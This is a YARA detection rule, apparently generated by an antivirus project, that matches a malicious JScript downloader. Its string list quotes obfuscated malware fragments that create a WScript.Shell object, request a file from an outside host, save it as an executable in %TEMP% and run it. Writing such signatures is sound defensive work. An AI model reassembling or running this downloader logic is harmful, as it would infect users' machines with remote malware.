rule sig_20160329_e7f6bfaaca8fe2fd43bf78f3e1fb27b3 {
  meta:
    description = "datamaliciousorder - file 20160329_e7f6bfaaca8fe2fd43bf78f3e1fb27b3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "44bea315f55439684d836f810ce588a2a96e267e2a24e721fd054799ad6b5f89"

  strings:
    $s1  = "function Ylign() {return Iazlrmnai[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"s45eUsUDIS.exe\";};" fullword ascii
    $s2  = "Jobgm[Ioltuvs](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Duhedi](Genmpwurzh() * 11)} while (Jobgm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Shbiytux(Aiexmiyws, Jtrznnzv){return Aiexmiyws - Jtrznnzv;};" fullword ascii
    $s5  = "var Iazlrmnai = function Eqvztk() {return WScript[Swxgwfgaj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Enwbxsd(Qnxtjlcw){Iazlrmnai[\"Run\"](Qnxtjlcw, Yojoaehwz, Yojoaehwz);};" fullword ascii
    $s7  = "function Ioapdhib() {return ((Gjkhiltg == true) && (Gjkhiltg == Vhmuhgqc)) ? 1 : Yojoaehwz;};" fullword ascii
    $s8  = "function Rukvoef(){return Swxgwfgaj;};" fullword ascii
    $s9  = "function Rdyojay(){return Chdybjnok;};" fullword ascii
    $s10 = "var Fyolx = new this[\"Date\"]();" fullword ascii
    $s11 = "var Gjkhiltg = false;" fullword ascii
    $s12 = "Gjkhiltg = true; " fullword ascii
    $s13 = "function Genmpwurzh(){return 22;};" fullword ascii
    $s14 = "Vhmuhgqc = true; " fullword ascii
    $s15 = "var Zrvrp = false;" fullword ascii
    $s16 = "function Gsdkz()" fullword ascii
    $s17 = " while (Zcwnqgs){" fullword ascii
    $s18 = "return Shbiytux(Guggxyr, Ajwuhjz);" fullword ascii
    $s19 = "var Vhmuhgqc = false;" fullword ascii
    $s20 = "function Ukcbvz(Unoprqhjb) {var Rghbrlu = (1, 2, 3, 4, 5, Unoprqhjb); return Rghbrlu;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}